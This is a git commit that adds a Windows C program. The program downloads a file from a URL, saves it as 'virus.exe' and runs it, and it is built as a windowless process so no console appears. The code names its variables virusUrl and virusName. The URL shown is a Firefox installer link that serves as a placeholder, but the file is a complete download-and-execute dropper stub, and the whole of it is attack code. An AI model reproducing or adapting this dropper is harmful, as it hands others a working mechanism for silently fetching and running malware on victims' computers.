09893fd8479565645bb8df449abc7573f4081096
Daniil Nababkin <43863412+TheRavehorn@users.noreply.github.com>
2020-11-20 17:03:17 +0200

    Create main.c

---
+++ main.c
@@ -0,0 +1,34 @@
+#include <Windows.h>
+#include <urlmon.h>
+#include <stdio.h>
+
+#pragma comment(lib, "urlmon.lib")
+#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")
+
+// Uses URLDownloadToFileW to download and save a file from the internet
+int downloadFile(WCHAR *downloadUrl, WCHAR *fileName) {
+    printf("Downloading the file (%ws) from (%ws)...\n", fileName, downloadUrl);
+    return URLDownloadToFileW(NULL, downloadUrl, fileName, 0, NULL);
+}
+
+int main(void) {
+    // Initializing our variables
+    WCHAR virusUrl[] = TEXT(L"https://download.mozilla.org/?product=firefox-latest-ssl&os=win&lang=en-US");
+    WCHAR virusName[] = TEXT(L"virus.exe");
+    STARTUPINFOW si;
+    PROCESS_INFORMATION pi;
+    ZeroMemory(&si, sizeof(si));
+    si.cb = sizeof(si);
+    ZeroMemory(&pi, sizeof(pi));
+
+    // Downloading the file
+    downloadFile(virusUrl, virusName);
+
+    // Creating new process and executing the file
+    if(!CreateProcessW(virusName, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
+        printf("CreateProcess failed (%lu).\n", GetLastError());
+        return 1;
+    }
+
+    return 0;
+}
